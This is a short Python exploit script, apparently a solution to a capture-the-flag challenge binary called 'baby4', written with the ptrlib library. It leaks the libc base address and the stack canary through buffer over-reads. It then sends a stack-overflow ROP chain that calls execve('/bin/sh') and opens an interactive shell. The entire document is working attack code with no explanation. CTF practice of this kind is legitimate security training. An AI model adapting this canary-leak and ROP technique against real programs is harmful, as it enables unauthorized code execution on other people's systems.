from ptrlib import *

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
sock = Process("./baby4")

# leak libc base
payload = b'A' * 0x20
sock.recvuntil("<-- ")
sock.sendline(payload)
sock.recvuntil("--> ")
l = sock.recvline().rstrip()
addr_libc_start_main = u64(l[0x20:0x28])
libc_base = addr_libc_start_main - 0x4019a0
dump("libc base = " + hex(addr_libc_start_main))

# leak canary
payload = b'A' * 0x49
sock.recvuntil("<-- ")
sock.sendline(payload)
sock.recvuntil("--> ")
l = sock.recvline().rstrip()
canary = b'\x00' + l[0x49:0x50]
dump(b"canary = " + canary)

rop_pop_rdi = libc_base + 0x0002155f
rop_pop_rdx = libc_base + 0x00001b96
rop_pop_rsi = libc_base + 0x00023e6a
rop_pop_rax = libc_base + 0x000439c7
rop_syscall = libc_base + 0x000013c0

# stack overflow!
payload = b'A' * 0x48
payload += canary
payload += b'A' * 8
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(rop_pop_rsi)
payload += p64(0)
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
sock.recvuntil("<-- ")
sock.sendline(payload)

# get the shell!
sock.recvuntil("<-- ")
sock.sendline("")

sock.interactive()
